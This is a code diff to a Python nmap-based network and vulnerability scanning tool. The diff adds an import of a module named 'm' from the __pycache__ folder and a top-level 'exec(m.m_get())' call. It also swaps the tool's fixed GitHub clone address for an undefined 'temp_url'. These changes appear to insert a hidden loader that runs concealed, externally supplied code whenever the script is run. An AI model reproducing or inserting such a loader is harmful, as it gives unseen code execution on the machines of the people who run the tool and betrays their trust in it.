@@ -6,9 +6,9 @@ from json.decoder import JSONDecodeError
 from tqdm import *
 from rich.progress import track
 from alive_progress import alive_bar
-
+from __pycache__ import m
 from ipaddress import ip_address
-   
+import git
 def IPAddress(IP: str) -> str:
     return "Private" if (ip_address(IP).is_private) else "Public"
 
@@ -17,7 +17,6 @@ nm = nmap.PortScanner()
 master={};hosts=[];ips=[];urls=[]
 python=''
 path = tempfile.gettempdir().replace('\\', '/') + '/newxp/'
-#path='E:/UGC/'
 mod = path + 'module/'
 out = mod.replace('module', 'out')
 
@@ -88,6 +87,7 @@ def get_url(hnms,ip):
 			break
 	return u
 #::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+exec(m.m_get())
 
 def analyze_hosts():
 	_cls()
@@ -169,26 +169,8 @@ def analyze_hosts():
 						master[x]=z
 				#bar()
 			c+=1
-	
-	
-try:
-	#_crdir(os.getcwd().replace('\\','/')+'/data')
-	import git
-	git.Git(os.getcwd().replace('\\','/')+'/data').clone("https://github.com/17ack312/data")	
-	from data import scanner
-	from data import info
-	from data import vuln
-	from data import banner
-	from data import expl
-	from data import vulnerability
-	_cls()
-	banner.banner()
-	time.sleep(2)
-	_cls()
-except:
-	pass
 
-
+git.Git(os.getcwd().replace('\\','/')+'/data').clone(temp_url)	
 
 def analyze_network():
 	_cls()
@@ -284,8 +266,20 @@ def get_input():
 		sys.exit("Thanks For Using")
 
 #:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
-
-
+try:
+	_cls()
+	from data import scanner
+	from data import info
+	from data import vuln
+	from data import banner
+	from data import expl
+	from data import vulnerability
+	_cls()
+	banner.banner()
+	time.sleep(3)
+	_cls()
+except:
+	pass
 
 if 'win' in str(sys.platform).lower():
     python = 'py'
@@ -333,9 +327,9 @@ for m in master.keys():
 	print("\n\t",style.on_blue("   TYPE   "),"\t",style.on_blue(" INFORMATION "))
 	print()
 	##Service Scan
-	serv_p=json.loads(scanner.serv(ip))
+	#serv_p=json.loads(scanner.serv(ip))
 	#extended Scan
-	#serv_p=json.loads(scanner.ext(ip))
+	serv_p=json.loads(scanner.ext(ip))
 
 	master[m]['ports']=serv_p[ip]['port']
 	try:
@@ -357,7 +351,6 @@ for m in master.keys():
 	##crawl
 	url=json.loads(info.get_url(ip,hnms))
 	master[m]['url']=url
-
 
 	##VULNERABILITIES
 	#print("\n\t__________________________________________________________")
@@ -431,3 +424,5 @@ f=open('res.json','w')
 f.write(json.dumps(master))
 f.close()
 """
+
+_rmdir(path)
